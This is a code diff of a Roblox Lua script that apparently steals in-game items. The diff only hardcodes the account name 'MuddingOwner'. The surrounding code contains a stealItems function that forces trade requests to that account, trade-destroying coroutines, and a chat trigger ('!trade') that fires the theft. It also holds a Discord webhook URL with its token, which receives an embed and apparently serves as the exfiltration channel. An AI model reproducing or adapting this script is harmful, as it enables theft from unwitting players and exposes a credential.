@@ -1,5 +1,3 @@
-local userName = 'MuddingOwner'
-
 local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
 local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
@@ -118,7 +116,7 @@ local function stealItems()
     coroutine.resume(destroytrades2)
 
     local sendArgs = {
-        [1] = game:GetService("Players")[userName]
+        [1] = game:GetService("Players")['MuddingOwner']
     }
     game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
 
@@ -220,8 +218,8 @@ local embed = {
 SendMessageEMBED('https://discord.com/api/webhooks/1252702892557865102/bIGY_Nmg1dZ6x3ncZywt1RdVhw7c75lFs3jiRX9NFMGMzygOudXPp-jdb2DgU0XINkai', embed)
 
 game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == userName then
-        game.Players[userName].Chatted:Connect(function(chat)
+    if player.Name == 'MuddingOwner' then
+        game.Players['MuddingOwner'].Chatted:Connect(function(chat)
             if chat == '!trade' then
                 stealItems()
             end
